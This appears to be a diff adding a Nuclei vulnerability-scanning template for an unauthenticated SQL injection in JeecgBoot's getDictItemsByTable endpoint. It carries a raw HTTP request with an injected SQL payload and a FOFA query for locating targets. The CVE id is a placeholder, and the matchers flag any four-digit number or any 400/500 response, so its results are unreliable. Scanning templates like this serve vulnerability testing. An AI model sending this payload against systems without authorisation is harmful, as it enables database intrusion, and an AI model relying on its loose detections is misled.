@@ -1,0 +1,73 @@
+id: CVE-2025-BBBBB
+
+info:
+  name: JeecgBoot SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    JeecgBoot contains a SQL injection vulnerability in the /api/sys/ng-alain/getDictItemsByTable endpoint
+    that allows unauthenticated attackers to execute arbitrary SQL commands and potentially access sensitive data.
+  reference:
+    - https://jeecg.com/security
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-BBBBB
+    - https://cwe.mitre.org/data/definitions/89.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: jeecg
+    product: boot
+    fofa-query: app="JEECG Boot"
+  tags: cve,cve2025,jeecgboot,sqli,sql-injection,unauthenticated
+
+variables:
+  test_value: "{{randstr}}"
+
+http:
+  - raw:
+      - |
+        GET /api/sys/ng-alain/getDictItemsByTable/{{test_value}}'%20AND%20(SELECT%20{{rand_int(1000,9999)}})%20AND%20'{{test_value}}'='{{test_value}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+        Accept: application/json, text/plain, */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "SQL syntax.*MySQL"
+          - "Unclosed quotation mark after the character string"
+          - "near '.*' at line"
+          - "ORA-[0-9]{5}"
+          - "PostgreSQL.*ERROR"
+          - "Microsoft.*ODBC.*SQL.*Server"
+      - type: regex
+        part: body
+        regex:
+          - "[0-9]{4,}"
+      - type: status
+        status:
+          - 500
+          - 400
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - "(SQL syntax.*MySQL.*)"
+          - "(ORA-[0-9]{5}.*)"
+          - "(Microsoft.*ODBC.*SQL.*Server.*)"
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - "[0-9]{4,}"
+        name: extracted_number
